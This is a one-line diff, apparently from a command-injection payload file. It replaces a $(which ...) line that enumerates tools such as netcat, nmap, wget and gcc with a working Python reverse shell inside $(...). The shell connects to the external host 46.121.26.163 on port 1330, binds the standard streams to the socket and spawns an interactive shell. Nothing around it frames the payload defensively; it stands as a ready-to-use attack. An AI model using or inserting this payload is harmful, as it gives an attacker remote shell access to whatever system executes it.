@@ -1,1 +1,1 @@
-$(which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null)
+$(export RHOST="46.121.26.163";export RPORT=1330;/usr/bin/python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")')
